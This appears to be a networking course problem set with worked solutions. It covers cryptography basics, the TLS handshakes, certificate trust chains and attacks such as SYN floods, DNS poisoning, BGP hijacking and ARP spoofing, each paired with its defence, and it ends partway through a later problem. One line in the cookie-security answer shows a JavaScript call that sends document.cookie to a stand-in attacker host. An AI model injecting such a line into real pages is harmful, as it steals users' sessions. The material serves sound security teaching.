# EC 441 — Security: Cryptography & Protocols

---

## Problem 1: Cryptography Fundamentals — The Three Goals

### Problem Statement

Network security is built on three fundamental cryptographic goals. Before studying any protocol, you must understand what each one provides and — crucially — what it does **not** provide.

**(a)** Define **confidentiality**, **integrity**, and **authentication** precisely. For each one, give:
- A one-sentence technical definition
- What attack it defends against
- A concrete networking example of where it is needed

**(b)** Consider the following scenarios. For each, identify which of the three security goals is **violated** and explain why:

1. Alice sends Bob an encrypted email. Mallory intercepts it, changes one byte of the ciphertext, and forwards it. Bob decrypts it and gets garbled data.
2. Alice connects to `http://bank.com`. The page looks exactly like her real bank. She enters her password.
3. Alice and Bob communicate over a VPN. Eve records all the packets. She cannot read them now, but stores them hoping to decrypt them in 10 years when quantum computers exist.
4. Bob receives a message that says "Signed by Alice." He has no way to verify whether Alice actually sent it.

**(c)** Symmetric encryption and asymmetric (public-key) encryption serve different purposes in practice. Fill in the table:

| Property | Symmetric (e.g., AES) | Asymmetric (e.g., RSA) |
|----------|----------------------|------------------------|
| Key(s) used | | |
| Speed | | |
| Key distribution problem | | |
| Primary use in TLS | | |
| Example algorithm | | |

**(d)** The **key distribution problem** is the central challenge of symmetric encryption: how do two parties who have never met agree on a shared secret key over a public (insecure) channel? Explain intuitively how **Diffie-Hellman key exchange** solves this. Use the paint-mixing analogy — you do not need to explain the math.

**(e)** Why can't we just use asymmetric encryption (RSA) for all data in a TLS connection, instead of switching to symmetric keys after the handshake? (Hint: think about what you know from Lecture 20 about bandwidth and the sizes involved.)

---

### Solution

**(a) Three goals defined:**

**Confidentiality** — the message content is readable only by the intended recipient; no eavesdropper can learn the plaintext.
- Defends against: **passive eavesdropping** (Eve listens on the wire)
- Networking example: HTTPS encrypts HTTP traffic so that ISPs, coffee shop WiFi operators, and anyone with Wireshark on the same network cannot read your passwords or messages

**Integrity** — the message received is exactly the message sent; no one altered it in transit.
- Defends against: **active tampering** (Mallory modifies packets in flight)
- Networking example: TCP checksums detect corruption; TLS MACs (Message Authentication Codes) detect deliberate modification of encrypted records

**Authentication** — you are communicating with who you think you are; the identity of the other party is verified.
- Defends against: **impersonation / spoofing** (Mallory pretends to be the server)
- Networking example: HTTPS certificate verification — your browser checks that the server's TLS certificate was issued by a trusted CA for the hostname you typed

**(b) Identifying violated goals:**

1. **Integrity violated.** The message was encrypted (confidentiality holds — Mallory couldn't read it), but Mallory modified the ciphertext. Bob got garbled output because the ciphertext was tampered with. If integrity protection (a MAC) were in place, Bob would detect that the ciphertext was altered and reject it rather than decrypt garbage.

2. **Authentication violated.** Alice thought she was talking to her real bank, but she was actually on a fake site (phishing or DNS hijacking). There was no mechanism verifying the site's identity. With HTTPS and certificate validation, the browser would check whether the certificate is signed by a trusted CA for `bank.com` — a fake site cannot obtain that certificate (in theory).

3. **Confidentiality violated (future).** This is a **"harvest now, decrypt later"** attack. Confidentiality holds today, but if the encryption is based on RSA key exchange (not Diffie-Hellman), a future quantum computer could break RSA and decrypt all stored sessions retroactively. **Perfect Forward Secrecy (PFS)**, achieved by ephemeral Diffie-Hellman, defends against this — each session uses fresh keys that are never stored, so decrypting one session later doesn't help decrypt others.

4. **Authentication violated** (specifically, **non-repudiation / origin authentication** is missing). Bob received a message claiming to be from Alice, but without a **digital signature** he has no cryptographic proof that Alice sent it. Anyone could have written "Signed by Alice." A real digital signature uses Alice's private key — only she can produce it, and anyone with her public key can verify it.

**(c) Symmetric vs. Asymmetric comparison:**

| Property | Symmetric (e.g., AES) | Asymmetric (e.g., RSA) |
|----------|----------------------|------------------------|
| Key(s) used | One shared secret key | A public/private key pair |
| Speed | **Very fast** (hardware-accelerated, billions of bytes/second) | **Very slow** (~1000× slower than AES for same data size) |
| Key distribution problem | **Serious** — how do two parties agree on the shared key securely? | **None for distribution** — public key can be published openly |
| Primary use in TLS | **Bulk data encryption** (all application data after handshake) | **Key exchange and authentication** (handshake only) |
| Example algorithm | AES-128, AES-256, ChaCha20 | RSA-2048, ECDH, ECDSA |

**(d) Diffie-Hellman — paint mixing analogy:**

Imagine Alice and Bob want to agree on a secret paint color, but they can only communicate over a public channel where anyone can see what they send.

1. They publicly agree on a common starting color — say, **yellow**. Everyone knows this.
2. Alice secretly picks a private color — say, **red** — and mixes it with the public yellow to get **orange**. She sends orange to Bob.
3. Bob secretly picks a private color — say, **blue** — and mixes it with the public yellow to get **green**. He sends green to Alice.
4. Alice takes Bob's green and mixes in her secret red → gets **brown** (red + blue + yellow).
5. Bob takes Alice's orange and mixes in his secret blue → gets the same **brown** (red + blue + yellow).

They both arrived at the same final color (the shared secret) **without ever sending their private colors over the public channel**. Eve saw yellow, orange, and green — but mixing paints is easy in one direction and hard to reverse (like a one-way function), so she cannot figure out the individual private colors or reconstruct the final brown.

In reality, DH uses modular exponentiation instead of paint — computing `g^x mod p` is fast, but reversing it (the discrete log problem) is computationally infeasible with large numbers.

**(e) Why not use RSA for all data:**

RSA encryption is roughly **1000× slower** than AES for the same amount of data. Encrypting a 1 MB web page with RSA would take on the order of seconds; with AES it takes microseconds.

Additionally, RSA can only encrypt data up to the key size (~256 bytes for RSA-2048), so large data requires chunking with padding overhead. AES operates efficiently on arbitrary-length streams.

The standard solution — used by TLS — is a **hybrid approach**:
- Use asymmetric crypto (RSA or Diffie-Hellman) for the **handshake only** to securely establish a shared symmetric key. This is a small, one-time cost.
- Use symmetric crypto (AES) for **all actual data**, which is fast and efficient.

The handshake is expensive but happens once per connection; the bulk transfer is cheap and happens constantly. This is exactly why Lecture 20 shows TLS adding 1–2 RTTs of overhead (the asymmetric handshake) but then the data flows efficiently.

---

## Problem 2: TLS — The Protocol Behind HTTPS

### Problem Statement

TLS (Transport Layer Security) is the protocol that makes HTTPS secure. It runs between TCP and HTTP, adding confidentiality, integrity, and authentication to an otherwise plaintext connection.

**(a)** Describe the **TLS 1.2 handshake** step by step. For each step, state what is sent, what cryptographic operation is happening, and how many RTTs have elapsed after that step.

**(b)** TLS 1.3 redesigned the handshake to take **1 RTT** instead of 2 (for TLS 1.2). What specifically was changed? What did TLS 1.3 remove that was slowing down TLS 1.2?

**(c)** A TLS certificate contains several fields. For each field below, explain its purpose:
- `Subject: CN=www.bu.edu`
- `Issuer: DigiCert Inc`
- `Valid From / Valid To: May 1 2025 – May 1 2026`
- `Public Key: RSA 2048-bit`
- `Subject Alternative Names: www.bu.edu, bu.edu`
- `Signature: [bytes]`

**(d)** What is a **Certificate Authority (CA)**? What is the **chain of trust**? Explain how your browser decides whether to trust the certificate presented by `www.bu.edu` — walk through the entire verification process.

**(e)** What is a **man-in-the-middle (MITM) attack** on TLS? Precisely describe what the attacker does and what they intercept. Then explain why TLS with proper certificate validation defeats this attack — what specifically stops Mallory from presenting a fake certificate?

**(f)** Wireshark can capture TLS traffic but shows it as encrypted. However, you can configure Wireshark to decrypt TLS sessions if you have the **session keys**. In TLS 1.3 with ephemeral Diffie-Hellman (ECDHE), can a stored copy of the server's **private key** be used to decrypt a previously captured session? Why or why not? What property prevents this?

---

### Solution

**(a) TLS 1.2 handshake step by step:**

```
Client                                    Server
  |                                          |
  |-------- TCP SYN ----------------------->|  (TCP handshake starts)
  |<------- TCP SYN-ACK --------------------|
  |-------- TCP ACK ------------------------>|  RTT 1 complete (TCP connected)
  |                                          |
  |-- ClientHello --------------------------->|  TLS starts
  |   (supported cipher suites,              |
  |    TLS versions, client random)          |
  |                                          |
  |<-- ServerHello --------------------------|
  |    (chosen cipher suite,                 |
  |     server random)                       |
  |<-- Certificate --------------------------|
  |    (server's public key + cert chain)    |
  |<-- ServerHelloDone ---------------------|  RTT 2 complete (server done)
  |                                          |
  |-- ClientKeyExchange -------------------->|
  |   (pre-master secret, encrypted with     |
  |    server's public key)                  |
  |-- ChangeCipherSpec --------------------->|
  |-- Finished (encrypted) ---------------->|
  |                                          |
  |<-- ChangeCipherSpec --------------------|
  |<-- Finished (encrypted) ---------------|  RTT 3 complete (handshake done)
  |                                          |
  |======= Application data (encrypted) =======|  HTTP finally flows
```

**RTT breakdown:**
- RTT 1: TCP handshake
- RTT 2: ClientHello → ServerHello + Certificate + ServerHelloDone
- RTT 3: ClientKeyExchange + ChangeCipherSpec → Server's Finished
- Total: **3 RTTs before first HTTP byte** (1 TCP + 2 TLS)

**What's happening cryptographically:**
- Server sends its certificate (containing its public key)
- Client verifies the certificate with the CA chain
- Client generates a random **pre-master secret**, encrypts it with the server's public key (RSA), sends it
- Both sides derive the same session keys independently from: pre-master secret + client random + server random
- The "Finished" messages are MACs over the entire handshake transcript — both sides verify the handshake wasn't tampered with

**(b) TLS 1.3 — what changed to get to 1 RTT:**

TLS 1.2 required two TLS round-trips because:
1. The client had to wait for the server's cipher suite choice and certificate **before** it could send the key exchange
2. The handshake used RSA for key exchange — inherently sequential: send cert → client encrypts pre-master → server decrypts

**TLS 1.3's key changes:**

1. **Removed RSA key exchange entirely.** TLS 1.3 only supports Diffie-Hellman variants (ECDHE, DHE). This enables the client to speculatively send its DH key share in the **ClientHello** — without waiting to see the server's choices — because DH doesn't require knowing the server's public key first. This collapses RTT 2 and RTT 3 into a single round-trip.

2. **Removed weak/legacy cipher suites.** TLS 1.2 supported many old, broken options (RC4, 3DES, export ciphers). Negotiating which to use took time. TLS 1.3 only supports modern suites (AES-GCM, ChaCha20), so negotiation is simpler and faster.

3. **"0-RTT" for resumed sessions.** If client and server have talked before, TLS 1.3 allows the client to send application data in the very first message (0 RTT). Caveat: 0-RTT data is vulnerable to replay attacks and should not be used for non-idempotent requests (like POST).

Result: TLS 1.3 = **1 RTT for new connections** (TCP handshake + TLS handshake combined = 2 RTTs total, vs. TLS 1.2's 3 RTTs).

**(c) Certificate field purposes:**

- **`Subject: CN=www.bu.edu`** — the **Common Name** is the hostname this certificate was issued for. The browser checks that this matches the URL you typed. If you connected to `evil.com` but got a cert with CN=`www.bu.edu`, something is wrong.

- **`Issuer: DigiCert Inc`** — the **Certificate Authority** that signed this certificate, vouching for its authenticity. BU's IT team generated a key pair, submitted a certificate signing request to DigiCert, proved they control `bu.edu`, and DigiCert signed the cert with its own private key.

- **`Valid From / Valid To`** — the certificate's **validity period**. Before `Valid From` or after `Valid To`, the browser rejects it. This is why web servers must renew certificates annually (or every 90 days with Let's Encrypt). An expired certificate means the identity claim is no longer freshly verified.

- **`Public Key: RSA 2048-bit`** — the server's **public key** that TLS will use. During the handshake, the client uses this to verify the server's signature (proving the server owns the corresponding private key). This is the key that makes the certificate useful.

- **`Subject Alternative Names: www.bu.edu, bu.edu`** — the SANs list **all valid hostnames** for this certificate. A certificate can cover multiple names (e.g., both `www.bu.edu` and `bu.edu`). The browser checks the SAN list (not just CN) per modern standards.

- **`Signature: [bytes]`** — DigiCert's **cryptographic signature** over all the above fields, made with DigiCert's private key. Anyone who trusts DigiCert's public key (which is pre-installed in browsers) can verify this signature and confirm that DigiCert really did vouch for these fields. If any field was tampered with, the signature verification fails.

**(d) Certificate Authority and chain of trust:**

A **Certificate Authority (CA)** is an organization that verifies domain ownership and signs certificates. Examples: DigiCert, Let's Encrypt, Sectigo, Google Trust Services. Your browser comes pre-installed with ~150 trusted root CA certificates — these are the "trust anchors."

**Chain of trust** is how trust flows from a root CA down to the site certificate:

```
Root CA (DigiCert Root G2) — trusted by your browser (pre-installed)
    ↓ signed by Root CA
Intermediate CA (DigiCert TLS RSA SHA256 2020 CA1)
    ↓ signed by Intermediate CA
End-entity cert (www.bu.edu)
```

**Browser verification process for `www.bu.edu`:**

1. Server presents its certificate + intermediate CA certificate(s)
2. Browser checks: does the cert's Subject CN/SAN match `www.bu.edu`? ✓
3. Browser checks: is the certificate within its validity period? ✓
4. Browser verifies the end-entity cert's signature using the intermediate CA's public key ✓
5. Browser verifies the intermediate CA's cert signature using the root CA's public key ✓
6. Browser checks: is the root CA in its trusted store? ✓
7. Browser checks: has any cert in the chain been **revoked** (via CRL or OCSP)? ✓

If all checks pass → browser shows the padlock. If any fails → browser shows a certificate error warning.

**(e) Man-in-the-Middle attack — why TLS defeats it:**

**What a MITM attacker does:**
Mallory positions herself between Alice (browser) and the server. She intercepts Alice's TCP SYN, establishes her own connection to the real server, and presents herself to Alice as the server and to the server as Alice. She can see all plaintext, modify it, and re-encrypt it.

**Without TLS**, this works perfectly — Mallory reads and modifies everything.

**With TLS certificate validation**, Mallory must present a certificate to Alice's browser for `www.bu.edu`. She has two options, both defeated:

1. **Present the real BU certificate:** She doesn't have BU's private key, so she can't complete the TLS handshake — the browser will send encrypted data that only the real server (with the real private key) can decrypt.

2. **Present a fake certificate for `www.bu.edu`:** She needs DigiCert (or any trusted CA) to sign it. No legitimate CA will issue a certificate for `bu.edu` to Mallory because they verify domain ownership first. Alice's browser would reject a certificate signed by an untrusted CA.

**What stops Mallory:** She cannot forge a valid signature from a trusted CA for a domain she doesn't own. The cryptographic chain of trust makes it computationally infeasible to create a trusted certificate without the CA's private key.

**Caveat:** This fails if a CA is compromised (as happened with DigiNotar in 2011 — an Iranian MITM attack intercepted 300,000 Gmail users). Certificate Transparency logs now make unauthorized certificate issuance publicly detectable.

**(f) Perfect Forward Secrecy — why stored private key doesn't help:**

In TLS 1.2 with **RSA key exchange**: the client encrypts the pre-master secret with the server's long-term RSA public key. If an attacker records the encrypted session and later obtains the server's private RSA key, they can decrypt the pre-master secret → derive the session keys → decrypt all the stored session data. **No forward secrecy.**

In TLS 1.3 with **ephemeral Diffie-Hellman (ECDHE)**: the session key is derived from a Diffie-Hellman exchange using **temporary (ephemeral) key pairs** generated fresh for each session. After the session ends, these ephemeral private keys are **deleted from memory**. They are never stored anywhere.

Even if an attacker later obtains the server's long-term private key, it was never used to encrypt the pre-master secret — it was only used to sign the DH parameters (authentication). The actual session key material is gone forever.

This property is called **Perfect Forward Secrecy (PFS)**: compromise of long-term keys today cannot decrypt past sessions. Wireshark **cannot** decrypt TLS 1.3 ECDHE sessions from a stored packet capture using only the server's private key — you would need the ephemeral private keys, which were discarded at session end.

The only way to decrypt TLS 1.3 captures is by exporting the session keys at the time of the connection (e.g., using the `SSLKEYLOGFILE` environment variable in Chrome/Firefox) — which is how you do it legitimately for debugging.

---

## Problem 3: Attacks on Network Protocols

### Problem Statement

Understanding how protocols fail is essential for understanding why security mechanisms exist.

**(a)** **TCP SYN flood attack.** Describe precisely what a SYN flood does to a server. What resource does it exhaust? Why does the standard TCP three-way handshake create this vulnerability? Describe **SYN cookies** as a defense — what is the key insight?

**(b)** **DNS cache poisoning.** A DNS resolver caches responses from authoritative servers. Explain how an attacker can inject a fake DNS record into the resolver's cache. What makes this attack possible? What defense does **DNSSEC** provide?

**(c)** **BGP hijacking** (from Lecture 16). Describe how the Pakistan Telecom / YouTube 2008 attack worked at the protocol level. What property of BGP makes this attack possible? Connect this to **longest-prefix match** from Lecture 14.

**(d)** **ARP spoofing.** The Address Resolution Protocol (ARP) maps IP addresses to MAC addresses on a local network. Explain how an attacker on the same LAN can intercept all traffic between two other hosts using ARP. What layer of the stack is this attack at?

**(e)** For each of the four attacks above, fill in the table:

| Attack | Layer | Resource/Trust exploited | Primary defense |
|--------|-------|--------------------------|-----------------|
| SYN flood | | | |
| DNS cache poisoning | | | |
| BGP hijacking | | | |
| ARP spoofing | | | |

---

### Solution

**(a) TCP SYN Flood:**

**What it does:** The attacker sends a massive flood of TCP SYN packets to the server, each with a **spoofed (fake) source IP address**. For each SYN, the server:
1. Allocates a **Transmission Control Block (TCB)** — a data structure in memory representing the half-open connection
2. Sends SYN-ACK to the (fake) source IP
3. Waits for the final ACK to complete the handshake

The fake source IP never sends the ACK (it doesn't exist, or is an innocent machine unaware of the exchange). The server holds these half-open connections in its **SYN backlog queue** for ~75 seconds (the retransmission timeout) per entry.

**Resource exhausted:** The server's **SYN backlog queue** (limited memory). When full, the server silently drops new legitimate SYN packets — real users cannot connect. The server isn't CPU-bound; it's out of connection-state memory.

**Why TCP creates this vulnerability:** The TCP handshake requires the server to allocate state **before** the client has proved it can receive packets (before the final ACK). This is an asymmetry: the client costs almost nothing (send a packet, spoof IP, forget it), but the server must commit resources.

**SYN cookies defense:** The key insight is: **don't allocate state until the handshake completes**.

Instead of allocating a TCB for each incoming SYN, the server encodes all the connection state into the **Initial Sequence Number** it puts in the SYN-ACK:

```
ISN = hash(src_IP, src_port, dst_IP, dst_port, secret, timestamp)
      + encoded MSS + timestamp
```

The server sends SYN-ACK and **forgets the connection entirely**. If the legitimate ACK arrives, its acknowledgment number contains `ISN + 1` — the server can verify the hash, recover all connection parameters, and create the TCB at that point. A spoofed source never sends the ACK, so no state is ever held.

SYN floods no longer exhaust the server because it holds zero state per SYN — the client's ACK is the proof of a live connection.

**(b) DNS Cache Poisoning:**

DNS resolvers cache responses to avoid re-querying authoritative servers constantly. The attack injects a **forged DNS response** into the cache.

**The vulnerability:** DNS UDP queries include a 16-bit **transaction ID** (TXID). The resolver accepts whichever response arrives first with a matching TXID. If the attacker can **guess the TXID** and send a forged response before the real authoritative server responds, the resolver caches the fake record.

**Attack scenario (Kaminsky Attack, 2008):**
1. Attacker sends rapid queries to the resolver for `random1234.bank.com`, `random5678.bank.com`, etc. — random subdomains that don't exist, forcing the resolver to query the authoritative server each time.
2. Simultaneously, for each query, attacker sprays thousands of forged responses with random TXIDs, hoping to guess the correct TXID before the real response arrives.
3. The forged response includes: "the nameserver for `bank.com` is `ns.attacker.com`" — now **all future lookups** for `bank.com` go to the attacker's server.

Once the fake NS record is cached (TTL can be hours), the attacker can serve fraudulent IP addresses for `bank.com` to every user of that resolver.

**DNSSEC defense:** DNSSEC adds **cryptographic signatures** to DNS records. The authoritative server signs each DNS record with its private key. The resolver verifies the signature using the zone's public key (which is itself signed by the parent zone, up to the root). A forged response cannot have a valid signature → resolver rejects it. The TXID race condition becomes irrelevant because even a correctly-timed forged packet has an invalid signature.

**(c) BGP Hijacking (from Lecture 16):**

**What happened:** Pakistan Telecom announced to the global BGP routing table a prefix `208.65.153.0/24` — a **/24** (256 addresses) carved out of YouTube's legitimate **/22** block (1024 addresses).

**Why it caused an outage:** Routers use **longest-prefix match** (Lecture 14). Every router on the internet with both routes in its table:
- `208.65.153.0/22` → YouTube (legitimate, less specific)
- `208.65.153.0/24` → Pakistan Telecom (hijacked, more specific)

…would **always prefer** the /24 because it's longer (more specific). Traffic to those 256 addresses was routed to Pakistan Telecom's black hole instead of YouTube.

**What makes BGP vulnerable:** BGP is **trust-based** — routers accept prefix announcements from their BGP peers at face value. There is no cryptographic verification that a network really owns the prefix it's announcing. Any AS can announce any prefix. The internet's routing fabric is a web of bilateral trust relationships with no global authority verifying prefix ownership.

**Defense (RPKI — Resource Public Key Infrastructure):** RPKI cryptographically ties IP prefix ownership to AS numbers using certificates. Route Origin Authorizations (ROAs) are signed records saying "AS X is authorized to announce prefix P." Routers with RPKI validation reject announcements that don't match valid ROAs. Adoption is growing but not universal.

**(d) ARP Spoofing:**

ARP maps Layer 3 IP addresses to Layer 2 MAC addresses on a local Ethernet/WiFi segment. When Host A wants to send a packet to `10.0.0.1`, it broadcasts an ARP request: "Who has `10.0.0.1`? Tell `aa:bb:cc:dd:ee:ff`." The owner of `10.0.0.1` replies with its MAC address.

**ARP has no authentication.** Any machine on the LAN can send unsolicited ARP replies saying "I am `10.0.0.1`, my MAC is `attacker's MAC`."

**Attack:**
1. Mallory is on the same LAN as Alice, Bob, and the default gateway (`10.0.0.1`).
2. Mallory continuously sends ARP replies to Alice: "The MAC for `10.0.0.1` (gateway) is `Mallory's MAC`"
3. Mallory continuously sends ARP replies to the gateway: "The MAC for Alice's IP is `Mallory's MAC`"
4. Now all traffic from Alice to the internet (and back) flows through Mallory.
5. Mallory forwards it (so nobody notices) but can read/modify every packet → full MITM.

**Layer:** This attack is at **Layer 2 (Data Link Layer)** — it poisons the ARP cache, which is used before Layer 3 routing even begins. The attack is completely transparent to IP and TCP.

**Defenses:** Dynamic ARP Inspection (DAI) on managed switches — the switch maintains a DHCP snooping table of valid IP-to-MAC mappings and drops ARP packets that don't match. Also: static ARP entries (impractical at scale), or using IPv6 with SEND (Secure Neighbor Discovery) which authenticates NDP packets.

**(e) Comparison table:**

| Attack | Layer | Resource/Trust exploited | Primary defense |
|--------|-------|--------------------------|-----------------|
| SYN flood | Layer 4 (Transport) | Server's half-open connection queue memory | SYN cookies (stateless handshake) |
| DNS cache poisoning | Layer 7 (Application) | Unauthenticated UDP + 16-bit TXID guessable | DNSSEC (cryptographic signatures on records) |
| BGP hijacking | Layer 3 (Network) | Trust in peer BGP announcements; no prefix ownership verification | RPKI (cryptographically signed ROAs) |
| ARP spoofing | Layer 2 (Data Link) | Unauthenticated broadcast protocol; no sender verification | Dynamic ARP Inspection (DAI) on switches |

---

## Problem 4: Putting It Together — HTTPS End-to-End

### Problem Statement

A user types `https://www.bu.edu/login` into their browser on a BU campus network. Trace the **complete security story** from address bar to login page, identifying every place where cryptography or security protocols are active.

**(a)** Before a single TCP packet is sent, the browser must resolve `www.bu.edu` to an IP address. This involves DNS. What security risk exists here? What does the campus DNS resolver do, and why is its integrity important for HTTPS security?

**(b)** The browser opens a TCP connection, then begins the TLS handshake. Walk through each step of the **TLS 1.3 handshake**, identifying:
- What is sent in each message
- What is being proved or established
- When confidentiality begins

**(c)** After the TLS handshake, the browser sends an HTTP GET request. This request travels over TLS. A network sniffer (Wireshark on the campus network) captures the packets. What can the sniffer see, and what is hidden from it?

**(d)** The login page sends the user's password to the server via an HTML form using `POST`. Trace exactly what happens to the password bytes from the user's keyboard to the server's database lookup — identifying at every step what form the data is in and what protections apply.

**(e)** The server responds with a `Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict` header. A student says "the `session_id` is just a random string — it's not encrypted or signed, so it's insecure." Evaluate this claim. What makes a session cookie secure or insecure, and what attacks does each cookie attribute defend against?

---

### Solution

**(a) DNS and the chicken-and-egg problem:**

The browser must resolve `www.bu.edu` → IP address before opening a TCP connection. This DNS query typically goes over **plain UDP** — no encryption, no authentication. An attacker on the campus network (or a compromised router) could:
- Intercept the DNS query and return a fake IP address pointing to a malicious server
- The browser would then do a TLS handshake with the **wrong server**

**Why this still gets caught (mostly):** Even if DNS is poisoned and the browser connects to the wrong IP, the TLS handshake will **fail** — the attacker cannot produce a valid certificate for `www.bu.edu` signed by a trusted CA. The browser will show a certificate error.

**Why DNS integrity still matters:** An attacker who controls DNS AND has a certificate (e.g., through a compromised CA, or a wildcard cert for a lookalike domain) can conduct a MITM. This is why **DNS over HTTPS (DoH)** and **DNS over TLS (DoT)** encrypt DNS queries — and why **DNSSEC** cryptographically authenticates the answers.

**(b) TLS 1.3 handshake — step by step:**

```
RTT 1:
Client → Server: ClientHello
  - Supported TLS versions (1.3)
  - List of cipher suites (e.g., TLS_AES_256_GCM_SHA384)
  - Client random nonce
  - Key share: client's ephemeral DH public key (ECDH)
  PROVES: nothing yet; initiates negotiation

Server → Client: ServerHello
  - Chosen cipher suite
  - Server's ephemeral DH public key (ECDH)
  ESTABLISHES: Both sides can now compute the shared secret (DH)

Server → Client: EncryptedExtensions (now encrypted!)
  - Additional negotiated parameters
  CONFIDENTIALITY BEGINS HERE — all subsequent messages are encrypted

Server → Client: Certificate
  - Server's certificate (containing its public key)
  PROVES: server's claimed identity (pending signature check)

Server → Client: CertificateVerify
  - Signature over the entire handshake transcript using server's private key
  PROVES: server actually owns the private key matching the certificate

Server → Client: Finished
  - MAC over entire handshake transcript
  PROVES: handshake was not tampered with

RTT 2:
Client → Server: Finished
  - MAC over entire handshake transcript
  PROVES: client received the full handshake correctly

======= Application data flows here (encrypted with session keys) =======
```

**Key insight:** DH key agreement happens in RTT 1 (client sends its DH share in ClientHello; server sends its share in ServerHello). Both sides derive the shared secret from there. This is why confidentiality begins before the certificate is even sent — the certificate travels inside encrypted records.

**(c) What Wireshark can see vs. what's hidden:**

**Visible to the sniffer:**
- IP headers: **source and destination IP addresses** — the sniffer knows Alice is talking to `128.197.x.x` (BU's server)
- TCP headers: **source and destination ports**, sequence numbers, flags
- The **hostname being requested** may be visible in:
  - The TLS ClientHello's **SNI (Server Name Indication)** field — this is sent in plaintext so the server knows which certificate to present, and so CDNs can route traffic. The sniffer sees `www.bu.edu` from SNI.
  - **Certificate** — also partially readable during handshake (less so in TLS 1.3 which encrypts the cert)
- **Packet sizes and timing** — traffic analysis can reveal approximate page sizes even without decryption

**Hidden from the sniffer:**
- The **HTTP request path** — `/login` is hidden; sniffer only knows the server's IP, not which page
- **HTTP headers** — including cookies, authorization tokens, User-Agent
- **HTTP body** — including the username and password in the POST body
- **HTTP response body** — the page content
- The TLS **session keys** — each session uses fresh ephemeral DH keys

**(d) Password journey from keyboard to server:**

1. **User types password** → keystrokes are processed by the OS, stored in a browser memory buffer as plaintext: `"MySecretP@ss"`

2. **Browser builds HTTP POST request** → password is URL-encoded in the request body:
   ```
   POST /login HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   username=alice&password=MySecretP%40ss
   ```
   Still plaintext in browser memory.

3. **TLS record layer encrypts the HTTP data** using the negotiated session key (e.g., AES-256-GCM). The plaintext `username=alice&password=...` is encrypted. What goes on the wire is an opaque blob of ciphertext.

4. **TCP segments the TLS record** and adds its header. The ciphertext is now in TCP segments.

5. **IP wraps TCP segments** in datagrams and routes them across the campus network to BU's server.

6. **BU's server receives the IP datagrams**, reassembles TCP segments, hands TLS records to the TLS layer.

7. **TLS decrypts** using the server's copy of the session key → recovers the plaintext POST body.

8. **HTTP handler parses** the POST body → extracts `password = "MySecretP@ss"`.

9. **Server hashes the password** (e.g., bcrypt) and compares to the stored hash in the database. The plaintext password is never stored.

**Protection summary:** Steps 3–7 are protected by TLS (confidentiality in transit). Step 9 protects against database breaches (password hashing at rest). The weakest point is the browser itself — malware with keylogging or memory-reading capabilities can steal the password before TLS encrypts it.

**(e) Evaluating the session cookie security claim:**

The student is **partially right but mostly wrong** — here's the full picture.

**What they're right about:** The `session_id=abc123` value is indeed just a random string. It is not encrypted or digitally signed. If an attacker learns this value, they can use it to impersonate Alice to the server (this is called **session hijacking** or **cookie theft**).

**What makes it secure in practice:** The security comes from **how the cookie is transmitted and how it's used**, not from the cookie value itself:

1. **Secure flag** — the cookie is only transmitted over HTTPS (TLS). An attacker listening on the network sees only ciphertext — they cannot extract the cookie value because TLS protects it in transit. Without `Secure`, the cookie would be sent over plain HTTP and visible to a Wireshark capture.

2. **HttpOnly flag** — JavaScript running on the page cannot read `document.cookie`. A cross-site scripting (XSS) attack that injects malicious script cannot steal the session cookie. Without `HttpOnly`, one line of injected JavaScript (`fetch('evil.com?c='+document.cookie)`) exfiltrates all cookies.

3. **SameSite=Strict** — the browser does not attach the cookie to requests originating from other sites. A forged form on `evil.com` submitting to `bu.edu` will not carry the cookie. This prevents **CSRF** (Cross-Site Request Forgery).

4. **Server-side randomness** — if `session_id` is cryptographically random (e.g., 128 bits from a CSPRNG), an attacker cannot guess it by brute force. There are 2^128 possibilities.

**What can still go wrong:**
- If the server doesn't invalidate old session IDs on logout, they remain valid indefinitely
- If the session ID is too short or predictable, brute-force guessing is possible
- If HTTPS is somehow downgraded to HTTP (mitigated by HSTS from Lecture 19)
- Phishing — if the user submits their cookie to a lookalike site

**Bottom line:** A session cookie is secure not because of what it IS (a random string), but because of how it's PROTECTED (TLS in transit, HttpOnly against XSS, SameSite against CSRF, HTTPS-only flag). Remove any one of these and the attack surface opens up.

---

## Problem 5: Cryptographic Protocols in Context

### Problem Statement

**(a)** SSH (Secure Shell) is used for remote login. When you run `ssh alice@cs.bu.edu`, describe the security properties SSH provides. What layer does SSH operate at? What would happen (in terms of security) if someone used Telnet instead?

**(b)** **IPsec** secures at the IP layer (Layer 3), while **TLS** secures at the transport/application layer. Compare them: what does each protect? If a company uses IPsec for a site-to-site VPN, does this mean individual applications don't need TLS? Explain using the concept of **defense in depth**.

**(c)** Consider the following protocol between Alice and Bob — identify the **security flaw**:

```
1. Alice → Bob:  "I am Alice"
2. Bob → Alice:  nonce R (a random number)
3. Alice → Bob:  Encrypt(R, Alice's symmetric key K_AB)
4. Bob decrypts, verifies R matches → authenticates Alice
```

This is a challenge-response protocol. It correctly authenticates Alice to Bob. But it has a classic flaw — describe the **reflection attack** that Mallory can use to impersonate Alice to Bob without knowing K_AB.

**(d)** **Nonces** appear in nearly every security protocol (TLS ClientHello includes a client random; TCP ISN randomization uses a nonce; the challenge-response above uses one). What is the general purpose of a nonce? What attack does it prevent? What property must a nonce have to be useful?

**(e)** A student proposes the following argument: "Since all packets between my laptop and Google are encrypted by TLS, my ISP cannot do anything harmful with my traffic." Evaluate this claim carefully — what can your ISP see even with TLS? What can they NOT see?

---

### Solution

**(a) SSH security properties:**

SSH provides all three security goals over a TCP connection:

- **Confidentiality:** All data (commands, output, files) is encrypted using symmetric encryption (AES or ChaCha20) negotiated during the SSH handshake. A network sniffer sees only ciphertext.
- **Integrity:** SSH uses MACs (Message Authentication Codes) on every message — tampering is detected.
- **Authentication (both directions):**
  - **Server authentication:** The SSH client verifies the server's host key against a locally stored known_hosts file — preventing impersonation. (First connection requires the user to manually verify the server's fingerprint — "trust on first use" / TOFU model.)
  - **Client authentication:** The server verifies the client via password or (preferably) public key — the client signs a challenge with their private key, and the server verifies with the stored public key.

SSH operates at **Layer 7 (Application layer)** — it runs over TCP and encrypts the application-layer byte stream.

**Telnet vs SSH:** Telnet sends everything in plaintext — username, password, every command typed, every output character. A single `tcpdump` or Wireshark capture on the same network reveals complete session content. There is also no server authentication — you can Telnet to a MITM and never know. Telnet is effectively obsolete for any security-sensitive use.

**(b) IPsec vs TLS — Defense in Depth:**

**IPsec** encrypts at Layer 3 — the entire IP payload is encrypted/authenticated. This means:
- All traffic between two sites is protected (TCP, UDP, ICMP, everything)
- The protection is transparent to applications — they don't need to know about it
